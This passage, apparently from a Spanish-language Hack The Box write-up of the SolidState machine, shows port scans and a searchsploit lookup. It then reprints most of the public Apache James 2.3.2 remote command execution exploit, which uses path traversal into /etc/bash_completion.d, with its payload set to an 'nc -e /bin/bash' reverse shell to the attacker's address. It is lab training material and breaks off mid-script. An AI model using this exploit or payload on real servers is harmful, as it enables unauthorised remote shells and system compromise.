-|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-25/tcp   open  smtp    JAMES smtpd 2.3.2
-|_smtp-commands: solidstate Hello nmap.scanme.org &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.14.16 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.16]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp   open  http    Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-|_http-title: Home - Solid State Security
-|_http-server-header: Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-110/tcp  open  pop3    JAMES pop3d 2.3.2
-119/tcp  open  nntp    JAMES nntpd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;posting ok&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-4555/tcp open  rsip?
-| fingerprint-strings: 
-|   GenericLines: 
-|     JAMES Remote Administration Tool 2.3.2
-|     Please enter your login and password
-|     Login &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:
-|     Password:
-|     Login failed &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; 
-|_    Login &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port4555-TCP:V&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.92%I&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10/19%Time&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;616F8C6B%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;G
-SF:enericLines,7C,&lt;span class=&quot;s2&quot;&gt;&quot;JAMES&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Remote&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Administration&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20Tool&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;202&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;P
-SF:lease&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20enter&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20your&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20login&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20and&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20password&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Login&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20id:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Passw
-SF:ord:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Login&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20failed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20for&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Login&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;20id:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-Service Info: Host: solidstate&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;266.14 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos el servicio HTTP por el puerto 80, así que mediante el uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; trataremos de ver que tecnologías presenta el sitio web:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.51/
-http://10.10.10.51/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.25], Country[RESERVED][ZZ], Email[webadmin@solid-state-security.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.51], JQuery, Script, Title[Home - Solid State Security]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que nos enfrentamos ante un &lt;strong&gt;Apache 2.4.25&lt;/strong&gt;, en servidor con sistema operativo &lt;strong&gt;Debian&lt;/strong&gt; y un correo electrónico &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webadmin@solid-state-security.com&lt;/code&gt; que viendo el dominio, no se encuentra relacionado con la plataforma de Hack The Box; así que sólo nos quedamos por el posible usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webadmin&lt;/code&gt;. Ahora vamos a ver el contenido vía web:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-solidstate/solidstate-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si tratamos de buscar por la web, no encontramos nada interesante o de relevancia. Analizando nuestra captura de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;, tenemos un puerto curioso 4555 asociado al servicio &lt;strong&gt;&lt;em&gt;JAMES Remote Administration Tool 2.3.2&lt;/em&gt;&lt;/strong&gt;. A partir de este punto existen dos formas para poder ingresar a la máquina; el primero es mediante un exploit público asociado a la tecnología &lt;strong&gt;&lt;em&gt;Apache James 2.3.2&lt;/em&gt;&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit james 2.3.2
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
- Exploit Title                                                                                 |  Path
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Metasploit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;           | linux/remote/48130.rb
-Apache James Server 2.3.2 - Remote Command Execution                                           | linux/remote/35513.py
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-Shellcodes: No Results
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Lo descargamos en nuestro directorio de trabajo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; linux/remote/35513.py
-  Exploit: Apache James Server 2.3.2 - Remote Command Execution
-      URL: https://www.exploit-db.com/exploits/35513
-     Path: /usr/share/exploitdb/exploits/linux/remote/35513.py
-File Type: Python script, ASCII text executable, with CRLF line terminators
-
-Copied to: /home/k4miyo/Documentos/HTB/SolidState/content/35513.py
-
-
-❯ &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;35513.py james_rce.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora, analizamos el exploit para ver que realiza y si es necesario realizar modificaciones para nuestro caso. El parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload&lt;/code&gt; lo modificaremos para que se nos entable una reverse shell a nuestro máquina de atacate:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'nc -e /bin/bash 10.10.14.23 443'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al ejecutar el exploit, vemos que nos solicita parámetros:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python2 james_rce.py
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-]Usage: python james_rce.py &amp;lt;ip&amp;gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-]Exemple: python james_rce.py 127.0.0.1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a asignarle la dirección IP de la máquina víctima y nos ponemos en escucha por el puerto 443:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python2 james_rce.py 10.10.10.51
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+]Connecting to James Remote Administration Tool...
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+]Creating user...
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+]Connecting to James SMTP server...
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+]Sending payload...
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+]Done! Payload will be executed once somebody logs &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora tenemos que esperar que alguien se loguee para que se nos entable la shell; sin embargo, para este caso no vamos a recibir ninguna solicitud, por lo que vamos a tomar otro camino siguiendo un poco el proceso del exploit.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
-#
-# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
-# Date: 16\10\2014
-# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
-# Vendor Homepage: http://james.apache.org/server/
-# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
-# Version: Apache James Server 2.3.2
-# Tested on: Ubuntu, Debian
-# Info: This exploit works on default installation of Apache James Server 2.3.2
-# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# specify payload
-#payload = 'touch /tmp/proof.txt' # to exploit on any user 
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'nc -e /bin/bash 10.10.14.23 443'&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# to exploit only on root
-# credentials to James Remote Administration Tool (Default - root/root)
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'root'&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'root'&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[-]Usage: python &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;lt;ip&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[-]Exemple: python &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s 127.0.0.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]Connecting to James Remote Administration Tool...&quot;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4555&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]Creating user...&quot;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;adduser ../../../../../../../../etc/bash_completion.d exploit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;quit&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]Connecting to James SMTP server...&quot;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ehlo team@team.pl&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]Sending payload...&quot;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mail from: &amp;lt;'@team.pl&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;# also try s.send(&quot;rcpt to: &amp;lt;../../../../../../../../etc/bash_completion.d@hostname&amp;gt;\r\n&quot;) if the recipient cannot be found
